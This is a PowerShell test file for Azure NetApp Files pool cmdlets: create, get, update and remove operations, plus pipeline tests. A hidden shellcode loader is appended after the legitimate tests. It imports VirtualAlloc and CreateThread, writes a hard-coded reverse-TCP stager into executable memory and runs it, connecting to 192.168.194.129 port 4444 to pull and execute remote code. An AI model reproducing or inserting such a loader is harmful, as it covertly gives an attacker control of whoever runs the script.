














function Test-PoolCrud
{
    $resourceGroup = Get-ResourceGroupName
    $accName = Get-ResourceName
    $poolName1 = Get-ResourceName 
    $poolName2 = Get-ResourceName 
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    $poolSize = 4398046511104
    $serviceLevel = "Premium"
    
    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation

        
        $retrievedAcc = New-AzNetAppFilesAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName 
	    
        
        $newTagName = "tag1"
        $newTagValue = "tagValue1"
        $retrievedPool = New-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName1 -PoolSize $poolSize -ServiceLevel $serviceLevel -Tag @{$newTagName = $newTagValue}
        Assert-AreEqual "$accName/$poolName1" $retrievedPool.Name
        Assert-AreEqual $serviceLevel $retrievedPool.ServiceLevel
        Assert-AreEqual True $retrievedPool.Tags.ContainsKey($newTagName)
        Assert-AreEqual "tagValue1" $retrievedPool.Tags[$newTagName].ToString()

        
        $retrievedPool = New-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName2 -PoolSize $poolSize -ServiceLevel $serviceLevel -Confirm:$false
        Assert-AreEqual "$accName/$poolName2" $retrievedPool.Name
		
        
        $retrievedPool = New-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName2 -PoolSize $poolSize -ServiceLevel $serviceLevel -WhatIf

        
        $retrievedPool = Get-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName
        
        Assert-True {"$accName/$poolName1" -eq $retrievedPool[0].Name -or "$accName/$poolName2" -eq $retrievedPool[0].Name}
        Assert-True {"$accName/$poolName1" -eq $retrievedPool[1].Name -or "$accName/$poolName2" -eq $retrievedPool[1].Name}
        Assert-AreEqual 2 $retrievedPool.Length

        
        $retrievedPool = Get-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName1
        Assert-AreEqual "$accName/$poolName1" $retrievedPool.Name

        
        $retrievedPoolById = Get-AzNetAppFilesPool -ResourceId $retrievedPool.Id
        Assert-AreEqual "$accName/$poolName1" $retrievedPoolById.Name

        
        
        $retrievedPool = Update-AzNetAppFilesPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -PoolName $poolName1 -ServiceLevel "Standard"
        Assert-AreEqual "$accName/$poolName1" $retrievedPool.Name
        Assert-AreEqual "Standard" $retrievedPool.ServiceLevel

        
        $retrievedPool = Update-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName1
        Assert-AreEqual "$accName/$poolName1" $retrievedPool.Name
        Assert-AreEqual "Standard" $retrievedPool.ServiceLevel

        
        Remove-AzNetAppFilesPool -ResourceId $retrievedPoolById.Id

        
        Remove-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName2 -WhatIf
        $retrievedPool = Get-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName
        Assert-AreEqual 1 $retrievedPool.Length

        Remove-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName -PoolName $poolName2
        $retrievedPool = Get-AzNetAppFilesPool -ResourceGroupName $resourceGroup -AccountName $accName
        Assert-AreEqual 0 $retrievedPool.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}



function Test-PoolPipelines
{
    $resourceGroup = Get-ResourceGroupName
    $accName = Get-ResourceName
    $poolName1 = Get-ResourceName
    $poolName2 = Get-ResourceName
    $resourceLocation = Get-ProviderLocation "Microsoft.NetApp"
    $poolSize = 4398046511104
    $serviceLevel = "Premium"
    
    try
    {
        
        New-AzResourceGroup -Name $resourceGroup -Location $resourceLocation

        
        New-AnfAccount -ResourceGroupName $resourceGroup -Location $resourceLocation -Name $accName | New-AnfPool -Name $poolName1 -PoolSize $poolSize -ServiceLevel $serviceLevel
		
        
        $retrievedPool = Get-AnfPool -ResourceGroupName $resourceGroup -AccountName $accName -Name $poolName1 | Update-AnfPool -ServiceLevel "Standard"
        Assert-AreEqual "Standard" $retrievedPool.ServiceLevel
		
        
        $retrievedPool = Get-AnfAccount -ResourceGroupName $resourceGroup -Name $accName | Update-AnfPool -Name $poolName1 -PoolSize $poolSize -ServiceLevel "Premium"
        Assert-AreEqual "Premium" $retrievedPool.ServiceLevel

        
        Get-AnfAccount -ResourceGroupName $resourceGroup -Name $accName | Remove-AnfPool -Name $poolName1 

        
        New-AnfPool -ResourceGroupName $resourceGroup -Location $resourceLocation -AccountName $accName -Name $PoolName1 -PoolSize $poolSize -ServiceLevel $serviceLevel

        
        Get-AnfAccount -ResourceGroupName $resourceGroup -Name $accName | New-AnfPool -PoolName $poolName2 -PoolSize $poolSize -ServiceLevel $serviceLevel

        
        Get-AnfPool -ResourceGroupName $resourceGroup -AccountName $accName -Name $poolName1 | Remove-AzNetAppFilesPool

        $retrievedPool = Get-AnfAccount -ResourceGroupName $resourceGroup -AccountName $accName | Get-AnfPool 
		Assert-AreEqual 1 $retrievedPool.Length
    }
    finally
    {
        
        Clean-ResourceGroup $resourceGroup
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

